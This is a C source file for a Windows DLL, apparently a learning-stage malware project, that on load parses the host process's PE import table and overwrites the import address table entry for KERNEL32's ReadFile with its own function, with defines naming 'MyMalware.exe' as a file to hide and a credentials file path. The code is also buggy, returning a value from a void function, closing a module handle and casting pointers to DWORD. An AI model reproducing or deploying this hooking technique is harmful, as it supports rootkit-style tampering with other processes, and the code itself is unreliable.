#define _CRT_SECURE_NO_WARNING
#define DLL_EXPORT
#define HOOKED_API_FUNCTION

#define HOOKED_DLL "KERNEL32.dll"
#define HOOKED_FUNCTION "ReadFile"
#define FILE_TO_HIDE "MyMalware.exe"
#define DATA_FROM_INJECTION L"C:\\Windows\\System32\\Creds.txt"


#include "DllHeaders.h"
#include<Windows.h>
#include<Psapi.h>
#include<TlHelp32.h>
#include<winternl.h>
#include<stdlib.h>
#include<stdio.h>
//The hooking function
typedef BOOL(WINAPI* lpfn_ReadFile) (HANDLE hFile, LPVOID lpBuffer, DWORD nNumberOfBytesToRead, LPDWORD lpNumberOfBytesRead, LPOVERLAPPED lpOverlapped);
lpfn_ReadFile fn_ReadFile;

DWORD WINAPI GetProcessId()
{
	MessageBox(NULL, TEXT("hooked"), TEXT("PID hooked"), MB_OK);
	return 0;
}


void HookSystemCall()
{
	MODULEINFO ModuleInfo = { 0 };
	//Gets the start of the pe that we attack
	HMODULE Module = GetModuleHandle(NULL);
	//gets info of the attcked pe
	K32GetModuleInformation(GetCurrentProcess(),
		Module,
		&ModuleInfo,
		sizeof(MODULEINFO));
	//thae base address of the pe
	LPBYTE ImageBase = (LPBYTE)ModuleInfo.lpBaseOfDll;
	//dos header is the first header
	PIMAGE_DOS_HEADER DosHeader = (PIMAGE_DOS_HEADER)ImageBase;
	//caclculating Ntheader by adding the base addr with the offset
	PIMAGE_NT_HEADERS NtHeader = (PIMAGE_NT_HEADERS)(ImageBase + DosHeader->e_lfanew);
	//optional hedaer is in Ntheader
	PIMAGE_OPTIONAL_HEADER OptionalHeader = (PIMAGE_OPTIONAL_HEADER) & (NtHeader->OptionalHeader);
	//getting to the import table by getting to dada directory in index 1 and then choosing virtual address struct
	PIMAGE_IMPORT_DESCRIPTOR ImportDescriptor = (PIMAGE_IMPORT_DESCRIPTOR)(ImageBase + OptionalHeader->DataDirectory[1].VirtualAddress);
	//iterating each descriptor for finding the specific dll 
	for (; ImportDescriptor->Characteristics; ImportDescriptor++)
	{
		MessageBoxA(NULL, (char*)(ImageBase + ImportDescriptor->Name), "", NULL);
		if (!strcmp(HOOKED_DLL, (char*)(ImageBase + ImportDescriptor->Name)))
		{
			MessageBoxA(NULL, (char*)(ImageBase + ImportDescriptor->Name), "", NULL);
		

			break;
		}
	}
	//now we have the currect descriptor
	// 
	//points to the names of the functions
	PIMAGE_THUNK_DATA ThunkData = (PIMAGE_THUNK_DATA)(ImageBase + ImportDescriptor->OriginalFirstThunk);
	//points to addreses of the function
	PIMAGE_THUNK_DATA FirstThunk = (PIMAGE_THUNK_DATA)(ImageBase + ImportDescriptor->FirstThunk);

	PIMAGE_IMPORT_BY_NAME FunctionName;

	//iterating each function name and address
	for (; !(ThunkData->u1.Ordinal & IMAGE_ORDINAL_FLAG) && ThunkData->u1.AddressOfData; ThunkData++)
	{
		FunctionName = (PIMAGE_IMPORT_BY_NAME)(ImageBase + ThunkData->u1.AddressOfData);
		MessageBoxA(NULL, (char*)(FunctionName->Name), "", NULL);
	
		if (!strcmp(HOOKED_FUNCTION, (char*)FunctionName->Name))
		{
			MessageBoxA(NULL, (char*)(FunctionName->Name), "", NULL);
			break;
		}
		//increasing FirstThunk because the int and the iat are like a dictionary
		FirstThunk++;
	}
	DWORD Original = 0;
	//Changing the access protaction of the process to ReadWrite and saving the old one
	//we do so in order to actually change the iat
	VirtualProtect((LPVOID) & (FirstThunk->u1.Function), sizeof(DWORD), PAGE_READWRITE, &Original);
	//now will be placing our new function in the FirstThunk

	FirstThunk->u1.   Function = (DWORD)&GetProcessId;
	FunctionName = (PIMAGE_IMPORT_BY_NAME)(ImageBase + ThunkData->u1.AddressOfData);

	//restoring to the original protection access
	VirtualProtect((LPVOID) & (FirstThunk->u1.Function), sizeof(DWORD), Original, NULL);
	//at that point the function is hooked
	//closing the handler
	CloseHandle(Module);
	return 0;
	      





}

BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{

	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		HookSystemCall();
		break;
		return TRUE;
	}
}
